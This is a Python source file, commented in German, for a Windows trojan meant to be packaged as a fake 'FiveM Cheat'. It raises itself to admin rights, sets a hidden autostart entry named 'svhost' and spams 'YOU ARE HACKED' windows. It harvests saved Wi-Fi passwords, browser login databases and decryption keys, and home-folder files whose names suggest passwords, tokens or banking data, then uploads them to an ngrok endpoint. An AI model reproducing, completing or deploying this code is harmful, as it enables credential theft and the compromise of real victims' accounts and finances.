import tkinter as tk
import random
import winreg
import os
import sys
import ctypes
import time, zipfile, requests, subprocess, shutil, json, base64
try:
    import win32crypt
    from Cryptodome.Cipher import AES
except ImportError: pass

# --- CONFIG ---
# Ersetze das hier durch deine echte Ngrok-URL!
EXFIL_URL = ">>>!!!YOUR NGROG URL HERE!!!<<<"
AUTH_TOKEN = "MeinSicheresPasswort123"
DELAY = 5 # 5 Sekunden Wartezeit
def run_as_admin():
    # Prüfen, ob wir bereits Admin-Rechte haben
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        # Wenn nicht, Programm mit Admin-Rechten neu starten
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            # Aktuelle Instanz beenden
            sys.exit()
        except Exception as e:
            print(f"Fehler bei der Admin-Anforderung: {e}")
            sys.exit()

# Aufruf der Funktion ganz am Anfang
run_as_admin()

# Haupt-Fenster initialisieren, um Bildschirmgröße zu bekommen
root = tk.Tk()
# Bildschirm-Dimensionen abfragen
# Wir nehmen an, dass die Bildschirme horizontal nebeneinander stehen.
# Falls er 2 Monitore hat, verdoppeln wir die Breite für den Zufallsbereich.
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.withdraw()


def enable_autostart():
    # Pfad zum aktuellen Programm (wenn es als .exe kompiliert ist)
    exe_path = os.path.abspath(sys.argv[0])
    
    # Name des Registry-Keys (hier wird es als "svhost" gelistet)
    key_name = "svhost"
    
    # Registry-Pfad für Autostart
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Autostart aktiviert.")
    except Exception as e:
        print(f"Fehler: {e}")

# Aufruf beim Start des Programms
enable_autostart()

def open_new_window():
    new_window = tk.Toplevel(root)
    new_window.title("System-Warnung")
    new_window.geometry("250x100")
    
    # Zufällige Position berechnen
    # Wir erlauben Werte, die auch außerhalb des Hauptmonitors liegen (für Multi-Monitor)
    # Beispiel: Wenn er 2 Monitore hat, deckt dieser Bereich den Raum von -Monitorbreite bis +Monitorbreite ab
    x_pos = random.randint(-screen_width, screen_width)
    y_pos = random.randint(0, screen_height)
    
    # Position zuweisen: Format "Breite x Höhe + X + Y"
    new_window.geometry(f"500x250+{x_pos}+{y_pos}")
    
    # Text in das Fenster einfügen
    label = tk.Label(new_window, text="⚠️ YOU ARE HACKED ⚠️")
    label.pack(pady=20)
    
    # Nach 20ms das nächste Fenster (schneller = mehr Chaos)
    root.after(20, open_new_window)

# Erste Fenster-Erstellung starten
open_new_window()

root.mainloop()

def get_master_key(path):
    local_state = os.path.join(path, "Local State")
    if not os.path.exists(local_state): return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            c = json.load(f)
        key = base64.b64decode(c["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: return None

def get_wlan():
    out = ""
    try:
        r = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
        for n in [l.split(":")[1].strip() for l in r.split('\n') if ":" in l and "Profil" in l]:
            try:
                d = subprocess.check_output(f'netsh wlan show profile name="{n}" key=clear', shell=True).decode('cp850', errors='ignore')
                pw = "NICHT GEFUNDEN"
                for ln in d.split('\n'):
                    if ":" in ln and ("Schlüsselinhalt" in ln or "Key Content" in ln): pw = ln.split(":")[1].strip()
                out += f"SSID: {n} | PW: {pw}\n"
            except: continue
    except: pass
    return out

def deep_scan():
    f_list = []
    keys = ['pass', 'user', 'user_id', 'user_token', 'bot_token', 'webhook', 'API_KEY', 'login', 'zugang', 'geheim', 'kredit', 'rechnung', 'iban', 'wallet']
    exts = ['.txt', '.pdf', '.docx', '.lua', '.json', '.cfg', '.ini', '.html', '.js', '.xlsx']
    for r, d, files in os.walk(os.path.expanduser("~")):
        if any(x in r for x in ["AppData", "Windows", "Local Settings"]): continue
        for f in files:
            if any(e in f.lower() for e in exts) and any(k in f.lower() for k in keys):
                fp = os.path.join(r, f)
                try:
                    if os.path.getsize(fp) < 5*1024*1024: f_list.append(fp)
                except: pass
    return f_list

def add_browser_vaults(zip_object):
    user_data = os.environ['LOCALAPPDATA']
    roaming_data = os.environ['APPDATA']

    # Chromium Browser
    chromium_browsers = {
        "Chrome": os.path.join(user_data, r"Google\Chrome\User Data"),
        "Edge": os.path.join(user_data, r"Microsoft\Edge\User Data"),
        "Opera": os.path.join(roaming_data, r"Opera Software\Opera Stable"),
        "Opera_GX": os.path.join(roaming_data, r"Opera Software\Opera GX Stable")
    }

    for name, path in chromium_browsers.items():
        if not os.path.exists(path): continue
        key = get_master_key(path)
        if key: zip_object.writestr(f"{name}_master.key", base64.b64encode(key).decode())
        
        for prof in ["Default", "Profile 1", "."]: 
            login_db = os.path.join(path, prof, "Login Data")
            if os.path.exists(login_db):
                try:
                    tmp = os.path.join(os.environ['TEMP'], f"{name}_db_tmp")
                    shutil.copy2(login_db, tmp)
                    zip_object.write(tmp, f"{name}_{prof.replace('.','Root')}_Logins.db")
                    os.remove(tmp)
                except: pass

    # Firefox
    firefox_path = os.path.join(roaming_data, r"Mozilla\Firefox\Profiles")
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            prof_path = os.path.join(firefox_path, profile)
            for f_name in ["logins.json", "key4.db", "cert9.db"]:
                f_path = os.path.join(prof_path, f_name)
                if os.path.exists(f_path):
                    try: zip_object.write(f_path, f"Firefox_{profile}/{f_name}")
                    except: pass

def main():
    # 1. Wartezeit
    time.sleep(DELAY)
    
    z_path = os.path.join(os.environ['TEMP'], "pkg.zip")
    
    # 2. Sammeln
    try:
        with zipfile.ZipFile(z_path, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr("wlan.txt", get_wlan())
            add_browser_vaults(z)
            for f in deep_scan():
                try: z.write(f, os.path.relpath(f, os.path.expanduser("~")))
                except: pass
        
        # 3. Senden
        headers = {'X-Auth-Token': AUTH_TOKEN}
        with open(z_path, 'rb') as f:
            requests.post(EXFIL_URL, files={'file': f}, headers=headers, timeout=60)
            
    except Exception as e:
        pass

    sys.exit()

if __name__ == "__main__":
    main()
    
# python -m PyInstaller --onefile --noconsole --name "FiveM Cheat" --icon= "icon1.ico" trojan.py
